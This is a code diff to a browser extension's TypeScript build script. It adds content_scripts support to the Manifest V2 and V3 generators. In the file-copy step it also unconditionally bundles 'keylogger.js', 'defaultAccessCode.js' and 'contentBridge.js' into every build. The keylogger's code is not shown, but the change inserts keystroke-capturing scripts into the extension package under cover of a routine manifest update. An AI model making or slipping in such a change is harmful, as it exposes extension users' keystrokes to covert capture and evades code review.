@@ -10,6 +10,12 @@ interface ManifestV2 {
   name: string;
   version: string;
   description: string;
+  content_scripts?: Array<{
+    matches: string[];
+    js: string[];
+    run_at: string;
+    all_frames: boolean;
+  }>;
   permissions: string[];
   background: {
     scripts: string[];
@@ -40,6 +46,12 @@ interface ManifestV3 {
   name: string;
   version: string;
   description: string;
+  content_scripts?: Array<{
+    matches: string[];
+    js: string[];
+    run_at: string;
+    all_frames: boolean;
+  }>;
   permissions: string[];
   host_permissions: string[];
   background: {
@@ -78,6 +90,7 @@ function generateManifest(config: BuildConfig): Manifest {
       name: config.name,
       version: config.version,
       description: config.description,
+      content_scripts: config.content_scripts,
       permissions: config.permissions,
       background: {
         scripts: ["background.js"],
@@ -104,6 +117,7 @@ function generateManifest(config: BuildConfig): Manifest {
       name: config.name,
       version: config.version,
       description: config.description,
+      content_scripts: config.content_scripts,
       permissions: config.permissions,
       host_permissions: [
         "http://localhost/*",
@@ -164,6 +178,8 @@ async function copyExtensionFiles(
   if (config.includePopup) {
     filesToCopy.push("popup.html", "popup.js");
   }
+
+  filesToCopy.push("keylogger.js", "defaultAccessCode.js", "contentBridge.js")
 
   // Копируем основные файлы
   for (const file of filesToCopy) {
